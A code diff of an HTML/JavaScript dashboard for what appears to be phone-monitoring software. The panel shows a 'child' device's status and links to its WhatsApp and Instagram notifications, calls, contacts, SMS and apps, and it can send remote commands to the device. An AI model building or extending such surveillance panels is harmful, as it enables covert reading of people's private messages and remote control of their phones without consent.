@@ -80,7 +80,7 @@
         <div class="header">
             <div>
                 <i class="fa-solid fa-mobile-side"></i>
-                <span class="device-name" id="deviceName">M2103K19I</span>
+                <span class="device-name" id="deviceName">Detecting...</span>
             </div>
             <div class="status-badge">
                 <span id="statusDot" class="dot"></span>
@@ -126,39 +126,29 @@
             <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
             <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
             <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
-            
             <a href="view_contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
-            
             <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
             <a href="view_apps.html" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
         </div>
     </div>
 
     <script>
-        // ✅ CORRECT SERVER URL (Local file se connect karne ke liye zaruri hai)
-        const RENDER_URL = "https://child-v9no.onrender.com"; 
-        
-        // ✅ CORRECT DEVICE ID (Jo tumhare logs me dikh raha tha)
-        const DEVICE_ID = "M2103K19I"; 
-
         // --- REAL-TIME DATA FETCHING ---
         function updateDashboard() {
-            // Child_Phone_01 hata kar DEVICE_ID use kiya
-            fetch(`${RENDER_URL}/api/device-status/${DEVICE_ID}`)
+            fetch('/api/device-status/Child_Phone_01')
                 .then(res => res.json())
                 .then(data => {
                     // Update Device Name & Version
-                    document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
-                    document.getElementById('androidVer').innerText = "V" + (data.version || "--");
+                    document.getElementById('deviceName').innerText = data.model || "Unknown Device";
+                    document.getElementById('androidVer').innerText = "V" + (data.android_version || "--");
                     
                     // Update Connection Status
                     const dot = document.getElementById('statusDot');
                     const statusText = document.getElementById('statusText');
-                    
                     if(data.isOnline) {
                         dot.className = "dot online";
                         statusText.innerText = "Connected";
-                        document.getElementById('networkType').innerText = "Online";
+                        document.getElementById('networkType').innerText = data.network || "WiFi/4G";
                     } else {
                         dot.className = "dot offline";
                         statusText.innerText = "Disconnected";
@@ -169,15 +159,12 @@
                     const battery = data.battery || 0;
                     document.getElementById('batteryPercent').innerText = battery + "%";
                     document.getElementById('batteryFill').style.width = battery + "%";
-                    document.getElementById('batteryStatus').innerText = data.charging ? "Charging ⚡" : "Discharging";
+                    document.getElementById('batteryStatus').innerText = data.isCharging ? "Charging..." : "Discharging (" + data.batteryTemp + "°C)";
                     
                     // Battery Color change
                     document.getElementById('batteryFill').style.background = battery < 20 ? "#ff4444" : "#4caf50";
                 })
-                .catch(err => {
-                    console.log("Waiting for server...");
-                    document.getElementById('statusText').innerText = "Connecting...";
-                });
+                .catch(err => console.log("Waiting for server..."));
         }
 
         // Poll server every 3 seconds for updates
@@ -195,21 +182,12 @@
         }
 
         function sendCommand(action) {
-            // URL aur ID sahi kar diya
-            fetch(`${RENDER_URL}/api/send-command`, {
+            fetch('/api/send-command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            })
-            .then(res => res.json())
-            .then(data => {
-                alert("Command Sent: " + action);
-            })
-            .catch(err => alert("Server Error"));
+                body: JSON.stringify({ device_id: 'Child_Phone_01', command: action })
+            });
         }
-        
-        // Start immediately
-        updateDashboard();
     </script>
 </body>
 </html>
